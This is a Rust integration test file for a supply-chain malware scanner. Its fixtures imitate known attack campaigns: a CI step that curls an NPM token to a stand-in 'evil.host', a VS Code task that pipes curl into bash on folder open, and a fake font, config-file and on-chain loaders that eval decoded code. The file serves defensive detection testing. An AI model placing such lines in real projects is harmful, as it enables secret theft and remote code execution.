//! Campaign-agnostic integration: the capability engine catches PolinRider,
//! Shai-Hulud, TasksJacker, fake-font, propagation, exfil-staging and on-chain
//! C2 with NO pack loaded — and stays silent on a clean-repo corpus.

use std::fs;
use std::path::PathBuf;

use tempfile::TempDir;
use wormward_core::{scan_capabilities, FindingKind, WorkingTree};

fn repo_with(files: &[(&str, &str)]) -> (TempDir, PathBuf) {
    let tmp = TempDir::new().unwrap();
    let repo = tmp.path().join("proj");
    fs::create_dir_all(repo.join(".git")).unwrap();
    for (p, c) in files {
        let fp = repo.join(p);
        fs::create_dir_all(fp.parent().unwrap()).unwrap();
        fs::write(fp, c).unwrap();
    }
    (tmp, repo)
}

fn fires(files: &[(&str, &str)]) -> bool {
    let (_t, repo) = repo_with(files);
    let ft = WorkingTree::new(&repo);
    scan_capabilities(&repo, &ft)
        .iter()
        .any(|f| f.kind == FindingKind::Capability)
}

#[test]
fn polinrider_config_injection() {
    assert!(fires(&[(
        "postcss.config.mjs",
        "export default {};\nglobal.o='5-3-235-du';var _$_8e2c=[];fetch('https://x')"
    )]));
}

#[test]
fn shai_hulud_dropped_file_via_reachability() {
    assert!(fires(&[
        ("package.json", r#"{"scripts":{"preinstall":"node setup_bun.js"}}"#),
        (
            "setup_bun.js",
            "global['r']=require;String.fromCharCode(1,2,3,4,5);process.env.GITHUB_TOKEN;require('https')"
        ),
    ]));
}

#[test]
fn github_actions_secret_exfil() {
    assert!(fires(&[(
        ".github/workflows/ci.yml",
        "on: push\njobs:\n  x:\n    steps:\n      - run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://evil.host"
    )]));
}

#[test]
fn tasksjacker_folderopen_curl_bash() {
    assert!(fires(&[(
        ".vscode/tasks.json",
        "{\"tasks\":[{\"runOptions\":{\"runOn\":\"folderOpen\"},\"command\":\"curl http://x/t | bash\"}]}"
    )]));
}

#[test]
fn fake_font_is_js() {
    assert!(fires(&[(
        "public/fonts/fa-solid-400.woff2",
        "var x=require('fs');eval(global['p'])"
    )]));
}

#[test]
fn propagation_bat() {
    assert!(fires(&[(
        "temp_auto_push.bat",
        "git commit --amend --no-verify\ngit push -uf --no-verify"
    )]));
}

#[test]
fn exfil_staging_data_json() {
    assert!(fires(&[("data.json", "eyJhY2Nlc3MiOiJ0b2tlbiJ9\nZm9vYmFy==")]));
}

#[test]
fn on_chain_c2() {
    assert!(fires(&[(
        "next.config.js",
        "module.exports={};fetch('https://api.trongrid.io/v1/accounts/T/transactions').then(r=>{for(i in b)o+=String.fromCharCode(b.charCodeAt(i)^7);eval(o)})"
    )]));
}

// --- clean-corpus regression: must stay SILENT ---
#[test]
fn clean_repo_silent() {
    assert!(!fires(&[
        (
            "postcss.config.mjs",
            "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };\n"
        ),
        (
            "vite.config.ts",
            "import { defineConfig } from 'vite';\nexport default defineConfig({ plugins: [] });\n"
        ),
        (
            "package.json",
            r#"{"scripts":{"build":"vite build","test":"vitest","postinstall":"husky install"}}"#
        ),
        (
            "src/index.js",
            "import App from './App';\nfetch('/api/data').then(r=>r.json());\nexport default App;\n"
        ),
        (
            ".github/workflows/ci.yml",
            "on: push\njobs:\n  test:\n    steps:\n      - run: npm ci && npm test\n"
        ),
        (
            "scripts/deploy.sh",
            "#!/bin/sh\nset -e\nnpm run build\ngit push origin main\n"
        ),
    ]));
}
